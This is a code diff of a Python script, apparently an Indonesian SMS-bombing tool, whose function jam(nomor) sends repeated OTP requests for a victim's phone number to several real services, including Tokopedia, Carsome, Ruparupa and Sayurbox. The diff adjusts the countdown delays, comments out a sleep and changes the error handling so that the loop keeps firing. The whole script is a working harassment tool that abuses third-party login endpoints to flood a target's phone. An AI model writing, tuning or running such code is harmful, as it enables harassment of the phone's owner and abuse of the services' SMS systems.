@@ -263,7 +263,7 @@ def jam(nomor):
                     "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"
                 })
             )
-
+            # 7
             response_carsome = requests.post(
                 "https://www.carsome.id/website/login/sendSMS",
                 headers={
@@ -290,7 +290,7 @@ def jam(nomor):
                     "optType": 1
                 })
             )
-
+            # 8
             response_ruparupa = requests.post(
                 "https://wapi.ruparupa.com/auth/generate-otp",
                 headers={
@@ -328,7 +328,7 @@ def jam(nomor):
 
             if response_tokopedia.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Tokopedia!")
-                countdown(60)
+                countdown(120)
                 #time.sleep(60)
                 rto = False
             else:
@@ -336,7 +336,7 @@ def jam(nomor):
 
             if response_misteraladin.status_code == 429:
                 autoketik(f"{putih}Sukses Mengirim OTP Mister Aladin!")
-                countdown(60) 
+                countdown(100) 
                 #time.sleep(60)
                 rto = False
             else:
@@ -344,7 +344,7 @@ def jam(nomor):
 
             if response_kredito.status_code == 200:
                     autoketik(f"{putih}Sukses Mengirim OTP Kredito!")
-                    countdown(60)
+                    countdown(100)
                     #time.sleep(60)
                     rto = False
             else:
@@ -352,7 +352,7 @@ def jam(nomor):
             
             if response_maucash.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP dari Maucash!")
-                countdown(60)
+                countdown(100)
                 #time.sleep(60)
                 rto = False
             else:
@@ -360,7 +360,7 @@ def jam(nomor):
 
             if response_tokko.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Tokko!")
-                countdown(60)
+                countdown(100)
                 #time.sleep(60)
                 rto = False
             else:
@@ -368,7 +368,7 @@ def jam(nomor):
 
             if response_sayurbox.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Sayurbox!")
-                countdown(60)
+                countdown(100)
                 #time.sleep(60)
                 rto = False
             else:
@@ -376,7 +376,7 @@ def jam(nomor):
 
             if response_carsome.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Carsome!")
-                countdown(60)
+                countdown(100)
                 #time.sleep(60)
                 rto = False
             else:
@@ -384,31 +384,31 @@ def jam(nomor):
             
             if response_ruparupa.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Rupa-rupa!")
-                countdown(60)
-                time.sleep(60)
+                countdown(100)
+                #time.sleep(60)
                 rto = False
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Rupa-rupa. Status code: {response_ruparupa.status_code}")
             
         except requests.exceptions.ConnectionError:
             autoketik(f"{merah}Gagal membuat koneksi baru!")
-            time.sleep(1000) 
-            rto = True
+            time.sleep(500) 
+            rto = False
 
         except urllib3.exceptions.NewConnectionError:
             autoketik(f"{merah}Gagal membuat koneksi baru!")
-            time.sleep(1000) 
-            rto = True
+            time.sleep(500) 
+            rto = False
         
         except TimeoutError:
             autoketik(f"{merah} Upaya Koneksi Gagal!")
-            time.sleep(1000) 
-            rto = True
-        
+            time.sleep(500) 
+            rto = False
+
         except urllib3.exceptions.ProtocolError:
             autoketik(f"{merah} Upaya Koneksi Gagal!")
-            time.sleep(1000) 
-            rto = True
+            time.sleep(500) 
+            rto = False
         
         except KeyboardInterrupt:
             tanya(nomor)
